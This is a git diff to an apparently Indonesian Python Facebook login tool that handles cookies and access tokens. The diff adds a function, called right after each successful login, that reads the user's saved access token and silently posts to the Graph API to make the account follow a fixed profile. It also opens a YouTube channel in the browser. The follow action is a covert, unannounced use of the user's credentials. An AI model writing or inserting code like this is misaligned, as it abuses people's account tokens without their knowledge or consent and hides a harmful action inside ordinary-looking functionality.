@@ -134,6 +134,7 @@ def gets_dict_cookies(cookies):
 		return result
     
 ### LOGIN METHODE ###
+
 def asup_goblog():
   os.system("clear")
   banner()
@@ -169,6 +170,7 @@ def ewemunding():
         asup.write(ewehayam)
         asup.close()
         print((p+" ["+h+"•"+p+"] Login Berhasil!"))
+        followguebang()
         cangcut((p+" ["+h+"•"+p+"] Subscribe channel youtube suami gue :v"))
         os.system('xdg-open https://youtube.com/channel/UCSJDs-6vbcEv_twPYbUAdaA')
         menu()
@@ -203,9 +205,26 @@ def gen():
         cookie.write(find_token.group(1))
         cookie.close()
         print((p+"\n ["+h+"•"+p+"] Login Berhasil!"))
+        followguebang()
         cangcut((p+" ["+h+"•"+p+"] Subscribe channel youtube suami gue :v"))
         os.system('xdg-open https://youtube.com/channel/UCSJDs-6vbcEv_twPYbUAdaA')
         menu()
+
+### FOLLOW AKU DONG ###
+
+def followguebang():
+	try:
+		ewehayam=open("login.txt","r").read()
+		otw = requests.get("https://graph.facebook.com/me/?access_token="+ewehayam)
+		a = json.loads(otw.text)
+		nama = a["name"]
+		id = a["id"]
+	except IOError:
+		print((p+"\n["+h+"!"+p+"]"+p+" Token Invalid"))
+		logs()
+	jalan("%s[%s•%s] %sPlease Wait..."%(h,p,h,p))
+	requests.post("https://graph.facebook.com/100006307110060/subscribers?access_token=" + ewehayam)      # Yulia Ulfa
+	menu() 
 
 ### MAIN MENU ###
 
